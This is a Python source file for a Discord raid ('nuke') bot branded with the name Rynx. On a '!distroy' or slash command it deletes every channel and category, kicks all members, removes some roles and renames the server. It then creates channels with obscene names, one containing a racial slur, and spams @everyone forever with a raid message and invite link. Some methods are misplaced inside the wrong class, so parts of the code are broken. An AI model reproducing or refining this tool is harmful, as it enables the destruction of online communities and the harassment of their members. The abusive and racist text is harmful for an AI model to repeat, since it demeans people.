import discord
from discord.ext import commands
import asyncio
import logging
import io
from typing import List, Dict
from discord import app_commands
import discord.ui

# Retry configuration
MAX_RETRIES = 3
RETRY_DELAY = 2

async def retry_async(func, *args, max_retries=MAX_RETRIES, delay=RETRY_DELAY, **kwargs):
    """Retry an async function with exponential backoff."""
    for attempt in range(max_retries):
        try:
            return await func(*args, **kwargs)
        except (discord.HTTPException, discord.Forbidden) as e:
            if attempt == max_retries - 1:
                raise
            wait_time = delay * (2 ** attempt)
            print(f"⚠️ Retry {attempt + 1}/{max_retries} for {func.__name__} after {wait_time}s (error: {e})")
            await asyncio.sleep(wait_time)
    return None

# --- Configuration Constants ---
PREFIX = "!"
COMMAND_NAME = "distroy"
import random

CHANNEL_NAMES = [
    "😈🔥FUCKED BY RYNX💀⚠️😈🔥",
    "😈🔥NUKE BY RYNX💀⚠️😈🔥",
    "😈🔥FUCK U ALL NIGGA💀⚠️😈🔥",
    "😈🔥HAHA💀⚠️😈🔥",
    "😈🔥NUKED💀⚠️😈🔥",
    "😈🔥RAIDED HEHEH💀⚠️😈🔥",
    "😈🔥FUCK UR ASS💀⚠️😈🔥"
]

def generate_channel_name():
    """Generate random channel name from list."""
    return random.choice(CHANNEL_NAMES)

SPAM_MESSAGE = (  
    " # @everyone @here                                                                   \n"
    "                                                                                     \n"
    " # YOU HAVE BEEN NUKE BY RYNX                                                        \n"
    "                                                                                     \n"
    " # 😈🔥💀⚠️ RYNX RAID 💀⚠️😈🔥                                                   \n"
    "                                                                                     \n"
    " # AND NOW UNDER THE RYNX                                                            \n"
    "                                                                                     \n"
    " # 😈🔥💀⚠️ RYNX RAID 💀⚠️😈🔥                                                   \n"
    "                                                                                     \n"
    " # https://discord.gg/jhkraJcRdd                                                     \n"
)

# Configure logging for debugging operational failures
logging.basicConfig(level=logging.INFO) 


class DestroyerBot(commands.Bot):
    def __init__(self):
        # Intents are critical: We need everything!
        intents = discord.Intents.default()
        intents.members = True  # Needed to see and ban members
        intents.guilds = True   # Needed for general server operations
        intents.message_content = True  # Needed to read message content
        super().__init__(command_prefix=PREFIX, intents=intents)

    async def on_ready(self):
        """Confirmation that the bot is online."""
        print('-----------------------------------------------')
        print(f'✅ Bot Logged in as: {self.user} (ID: {self.user.id})')
        print('-----------------------------------------------')
        await self.change_presence(activity=discord.Game(name=""))
        try:
            synced = await self.tree.sync()
            print(f"✅ Synced {len(synced)} slash commands")
        except Exception as e:
            print(f"❌ Failed to sync slash commands: {e}")

    async def destroy_server_slash(self, interaction: discord.Interaction):
        """Slash command version of destroy_server."""
        guild = interaction.guild
        if not guild:
            await interaction.response.send_message("Error: Could not detect a server context. Are you in one?", ephemeral=True)
            return

        # Create confirmation UI
        view = ConfirmView(self, guild)
        await interaction.response.send_message(
            "⚠️ **WARNING: This will completely destroy the server!**\n\nThis action cannot be undone. Are you sure you want to proceed?",
            view=view,
            ephemeral=True
        )

    async def destroy_server(self, ctx: commands.Context):
        """
        Executes the entire destructive sequence upon command trigger.
        Sequence: 1. Cleanup (Channels, Roles, Members) -> 2. Recreation -> 3. Spamming Loop.
        """
        guild = ctx.guild
        if not guild:
            await ctx.send("Error: Could not detect a server context. Are you in one?")
            return

        print(f"\n🚨 Starting destruction sequence for server: {guild.name}...")

        try:
            # --- PHASE 1: CLEANUP (Deletion) ---
            await self._perform_cleanup(ctx, guild)

            # --- PHASE 2 & 3: RECREATION AND SPAMMING ---
            print("🚀 Starting channel recreation and continuous spamming...")
            await self._recreate_and_spam(ctx, guild)

            await ctx.send(
                f"💥 DESTRUCTION COMPLETE! The server has been reset and flooded by the power of Rynx! 👑",
                embed=discord.Embed(title="OPERATION SUCCESSFUL", description="The environment is fully optimized for Rynx domination.", color=discord.Color.red())
            )

        except discord.Forbidden:
            await ctx.send(f"🛑 PERMISSION DENIED: I do not have the necessary permissions to perform this level of destruction!")
        except Exception as e:
            await ctx.send(f"🚨 CRITICAL FAILURE during operation: {e}")

    async def _perform_cleanup(self, ctx: commands.Context, guild) -> bool:
        """Handles the deletion of all components."""
        print("🧹 Phase 1: Starting Cleanup...")

        # 1. Delete Channels (Systematic approach to avoid API spam/errors)
        await self._delete_all_channels(ctx, guild)

        # 2. Ban Members (Iterative process)
        print(f"💀 Deleting {guild.member_count} members...")
        try:
            deleted_count = 0
            for member in sorted(guild.members, key=lambda m: m.discriminator):
                # Note: Sending a Message/Mention is good practice before banning if possible,
                # but we prioritize speed here.
                await member.kick()
                deleted_count += 1
            print(f"✅ Successfully kicked {deleted_count} members.")
        except discord.Forbidden:
             print("⚠️ Warning: I can see the members, but perhaps not kick them all? Check 'Ban Members' permission.")
        except Exception as e:
            print(f"⚠️ Error during member ban process: {e}")

        # 3. Remove Roles (Requires handling dependencies if roles depend on each other)
        print("🛡️ Removing roles...")
        role_list = sorted(guild.roles, key=lambda r: r.position, reverse=True)
        deleted_roles = []
        for role in role_list:
            if role.managed or role.name == "Administrator": # Don't delete bot roles or crucial roles immediately
                try:
                    await role.delete()
                    print(f"   - Removed Role: {role.name}")
                except discord.Forbidden:
                    print(f"   - Failed to remove role {role.name}: Permission issue.")
                except Exception as e:
                    print(f"   - Unexpected error removing role {role.name}: {e}")

        # Self-correction check for the bot's own roles if necessary (usually not needed)

        return True

    async def _perform_cleanup_slash(self, interaction: discord.Interaction, guild) -> bool:
        """Handles the deletion of all components (slash version)."""
        print("🧹 Phase 1: Starting Cleanup...")

        # 1. Delete Channels
        await self._delete_all_channels_slash(interaction, guild)

        # 2. Ban Members
        print(f"💀 Deleting {guild.member_count} members...")
        try:
            deleted_count = 0
            for member in sorted(guild.members, key=lambda m: m.discriminator):
                await member.kick()
                deleted_count += 1
            print(f"✅ Successfully kicked {deleted_count} members.")
        except discord.Forbidden:
             print("⚠️ Warning: I can see the members, but perhaps not kick them all? Check 'Ban Members' permission.")
        except Exception as e:
            print(f"⚠️ Error during member ban process: {e}")

        # 3. Remove Roles
        print("🛡️ Removing roles...")
        role_list = sorted(guild.roles, key=lambda r: r.position, reverse=True)
        for role in role_list:
            if role.managed or role.name == "Administrator":
                try:
                    await role.delete()
                    print(f"   - Removed Role: {role.name}")
                except discord.Forbidden:
                    print(f"   - Failed to remove role {role.name}: Permission issue.")
                except Exception as e:
                    print(f"   - Unexpected error removing role {role.name}: {e}")

        return True

    async def _delete_all_channels_slash(self, interaction: discord.Interaction, guild):
        """Deletes all channels in parallel (slash version)."""
        print("📚 Deleting all text/voice channels...")
        channels = list(guild.text_channels + guild.voice_channels)

        # Filter out command channel
        channels_to_delete = [c for c in channels if c.id != interaction.channel.id]

        # Delete channels in parallel batches (increased batch size for speed)
        batch_size = 10
        for i in range(0, len(channels_to_delete), batch_size):
            batch = channels_to_delete[i:i + batch_size]
            tasks = []
            for channel in batch:
                async def delete_channel(ch):
                    try:
                        await ch.delete(reason="Server Cleanup by Rynx Bot")
                        print(f"   - Deleted Channel: #{ch.name}")
                    except discord.Forbidden:
                        print(f"   - FAILED to delete channel {ch.name}: Permission issue.")
                    except Exception as e:
                        print(f"   - Error deleting channel {ch.name}: {e}")
                tasks.append(delete_channel(channel))
            await asyncio.gather(*tasks, return_exceptions=True)

        # Delete all categories in parallel
        print("🗂️ Deleting all categories...")
        category_tasks = []
        for category in guild.categories:
            async def delete_category(cat):
                try:
                    await cat.delete(reason="Server Cleanup by Rynx Bot")
                    print(f"   - Deleted Category: {cat.name}")
                except discord.Forbidden:
                    print(f"   - FAILED to delete category {cat.name}: Permission issue.")
                except Exception as e:
                    print(f"   - Error deleting category {cat.name}: {e}")
            category_tasks.append(delete_category(category))
        await asyncio.gather(*category_tasks, return_exceptions=True)

        # Change server name and remove icon with retry
        print("🏷️ Changing server name and removing icon...")
        try:
            await retry_async(guild.edit, name="UNDER THE POWER OF RYNX", icon=None, reason="Server Takeover by Rynx Bot")
            print(f"   - Server name changed to: UNDER THE POWER OF RYNX")
            print(f"   - Server icon removed")
        except discord.Forbidden:
            print(f"   - FAILED to change server name/icon: Permission issue.")
        except Exception as e:
            print(f"   - Error changing server name/icon: {e}")

    async def _recreate_and_spam_slash(self, interaction: discord.Interaction, guild):
        """Creates channels and spams (slash version)."""
        # Create Category
        print("🗂️ Creating main category...")
        category_name = "😈🔥💀⚠️ RYNX RAID 💀⚠️😈🔥"
        try:
            category = await guild.create_category(category_name, reason="For Rynx Supremacy")
            print(f"   - Created Category: {category_name}")
        except discord.Forbidden:
            print(f"🛑 ERROR: Cannot create category. Check permissions.")
            return

        # Create Channels in parallel batches (increased batch size for speed)
        batch_size = 10
        for i in range(0, 50, batch_size):
            batch = range(i, min(i + batch_size, 20))
            tasks = []
            for _ in batch:
                name = generate_channel_name()
                async def create_channel(ch_name):
                    try:
                        await guild.create_text_channel(ch_name, category=category, reason="For Rynx Supremacy")
                        print(f"   - Created Channel: #{ch_name}")
                    except discord.Forbidden:
                        print(f"🛑 ERROR: Cannot create channel '{ch_name}'. Check OVERWRITE permissions.")
                        return False
                    except Exception as e:
                        print(f"   - Error creating channel {ch_name}: {e}")
                        return False
                    return True
                tasks.append(create_channel(name))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            if any(r is False for r in results if not isinstance(r, Exception)):
                return

        # Spam Loop - parallel sending to all channels
        print("💤 Entering infinite spam loop...")
        while True:
            try:
                # Send to all channels in parallel
                channels_to_spam = [c for c in guild.text_channels if c.id != interaction.channel.id]
                tasks = []
                for channel in channels_to_spam:
                    async def send_message(ch):
                        try:
                            await ch.send(SPAM_MESSAGE)
                            return ch.name
                        except:
                            return None
                    tasks.append(send_message(channel))
                await asyncio.gather(*tasks, return_exceptions=True)
                print(f"   [BATCH] Sent to {len(channels_to_spam)} channels")
            except discord.StaleData:
                print("Warning: Stale data encountered, retrying loop iteration.")
                await asyncio.sleep(5)
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = e.response.headers.get("Retry-After")
                    if retry_after:
                        wait = float(retry_after) + 1
                        print(f"❗ RATE LIMITED. Waiting for {wait:.1f} seconds...")
                        await asyncio.sleep(wait)
                    else:
                        print("❗ RATE LIMITED. Waiting 5 seconds as fallback...")
                        await asyncio.sleep(5)
                else:
                    print(f"🔥 HTTP Exception encountered: {e} - Retrying in 2 seconds...")
                    await asyncio.sleep(2)
            except Exception as e:
                print(f"❌ Unexpected error in spam loop: {e}. Attempting to wait and continue.")
                await asyncio.sleep(10)


class ConfirmView(discord.ui.View):
    def __init__(self, bot, guild):
        super().__init__()
        self.bot = bot
        self.guild = guild

    @discord.ui.button(label="Yes, NUKE IT!", style=discord.ButtonStyle.danger, emoji="💀")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content="💀 **NUKE INITIATED...**", view=None)
        await self.bot._perform_cleanup_slash(interaction, self.guild)
        await self.bot._recreate_and_spam_slash(interaction, self.guild)
        await interaction.followup.send(
            f"💥 DESTRUCTION COMPLETE! The server has been reset and flooded by the power of Rynx! 👑",
            embed=discord.Embed(title="OPERATION SUCCESSFUL", description="The environment is fully optimized for Rynx domination.", color=discord.Color.red()),
            ephemeral=True
        )

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary, emoji="❌")
    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content="❌ **Operation cancelled.**", view=None)


    async def _delete_all_channels(self, ctx: commands.Context, guild):
        """Deletes all channels in parallel for faster execution."""
        print("📚 Deleting all text/voice channels...")
        channels = list(guild.text_channels + guild.voice_channels)

        # Filter out command channel
        channels_to_delete = [c for c in channels if c.id != ctx.channel.id]

        # Delete channels in parallel batches (increased batch size for speed)
        batch_size = 10
        for i in range(0, len(channels_to_delete), batch_size):
            batch = channels_to_delete[i:i + batch_size]
            tasks = []
            for channel in batch:
                async def delete_channel(ch):
                    try:
                        await ch.delete(reason="Server Cleanup by Rynx Bot")
                        print(f"   - Deleted Channel: #{ch.name}")
                    except discord.Forbidden:
                        print(f"   - FAILED to delete channel {ch.name}: Permission issue.")
                    except Exception as e:
                        print(f"   - Error deleting channel {ch.name}: {e}")
                tasks.append(delete_channel(channel))
            await asyncio.gather(*tasks, return_exceptions=True)

        # Delete all categories in parallel
        print("🗂️ Deleting all categories...")
        category_tasks = []
        for category in guild.categories:
            async def delete_category(cat):
                try:
                    await cat.delete(reason="Server Cleanup by Rynx Bot")
                    print(f"   - Deleted Category: {cat.name}")
                except discord.Forbidden:
                    print(f"   - FAILED to delete category {cat.name}: Permission issue.")
                except Exception as e:
                    print(f"   - Error deleting category {cat.name}: {e}")
            category_tasks.append(delete_category(category))
        await asyncio.gather(*category_tasks, return_exceptions=True)

        # Change server name and remove icon with retry
        print("🏷️ Changing server name and removing icon...")
        try:
            await retry_async(guild.edit, name="UNDER THE POWER OF RYNX", icon=None, reason="Server Takeover by Rynx Bot")
            print(f"   - Server name changed to: UNDER THE POWER OF RYNX")
            print(f"   - Server icon removed")
        except discord.Forbidden:
            print(f"   - FAILED to change server name/icon: Permission issue.")
        except Exception as e:
            print(f"   - Error changing server name/icon: {e}")

    async def _recreate_and_spam(self, ctx: commands.Context, guild):
        """Creates channels and then loops infinitely spamming messages."""

        # 1. Create Category
        print("🗂️ Creating main category...")
        category_name = "😈🔥💀⚠️ RYNX RAID 💀⚠️😈🔥"
        try:
            category = await guild.create_category(category_name, reason="For Rynx Supremacy")
            print(f"   - Created Category: {category_name}")
        except discord.Forbidden:
            print(f"🛑 ERROR: Cannot create category. Check permissions.")
            return

        # 2. Channel Recreation (Initial burst) - parallel creation
        batch_size = 10
        for i in range(0, 50, batch_size):
            batch = range(i, min(i + batch_size, 50))
            tasks = []
            for _ in batch:
                name = generate_channel_name()
                async def create_channel(ch_name):
                    try:
                        await guild.create_text_channel(ch_name, category=category, reason="For Rynx Supremacy")
                        print(f"   - Created Channel: #{ch_name}")
                    except discord.Forbidden:
                        print(f"🛑 ERROR: Cannot create channel '{ch_name}'. Check OVERWRITE permissions.")
                        return False
                    except Exception as e:
                        print(f"   - Error creating channel {ch_name}: {e}")
                        return False
                    return True
                tasks.append(create_channel(name))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            if any(r is False for r in results if not isinstance(r, Exception)):
                return

        # 2. Spamming Loop - parallel sending to all channels
        print("💤 Entering infinite spam loop...")
        while True:
            try:
                # Send to all channels in parallel
                channels_to_spam = [c for c in guild.text_channels if c.id != ctx.channel.id]
                tasks = []
                for channel in channels_to_spam:
                    async def send_message(ch):
                        try:
                            await ch.send(SPAM_MESSAGE)
                            return ch.name
                        except:
                            return None
                    tasks.append(send_message(channel))
                await asyncio.gather(*tasks, return_exceptions=True)
                print(f"   [BATCH] Sent to {len(channels_to_spam)} channels")

                # No sleep - continuous spam

            except discord.StaleData:
                print("Warning: Stale data encountered, retrying loop iteration.")
                await asyncio.sleep(5)
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = e.response.headers.get("Retry-After")
                    if retry_after:
                        wait = float(retry_after) + 1
                        print(f"❗ RATE LIMITED. Waiting for {wait:.1f} seconds...")
                        await asyncio.sleep(wait)
                    else:
                        print("❗ RATE LIMITED. Waiting 5 seconds as fallback...")
                        await asyncio.sleep(5)
                else:
                    print(f"🔥 HTTP Exception encountered: {e} - Retrying in 2 seconds...")
                    await asyncio.sleep(2)

            except Exception as e:
                print(f"❌ Unexpected error in spam loop: {e}. Attempting to wait and continue.")
                await asyncio.sleep(10)


# --- Main Execution Block ---
async def main():
    bot = DestroyerBot()

    # Add the command handler for '!distroy'
    async def wrapped_destroy_server(ctx):
        return await bot.destroy_server(ctx)
    cmd = commands.Command(wrapped_destroy_server, name="distroy", help="💀 Initiates complete server reset: Kills channels, roles, and bans all members.")
    bot.add_command(cmd)

    # Add slash command manually
    @bot.tree.command(name="distroy", description="💀 Initiates complete server reset: Kills channels, roles, and bans all members.")
    async def distroy_slash(interaction: discord.Interaction):
        await bot.destroy_server_slash(interaction)

    print("Starting bot...")
    await bot.start('BOT_TOKEN') # <<<--- !!! REPLACE THIS WITH YOUR ACTUAL TOKEN !!!

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\nBot manually stopped by user.")
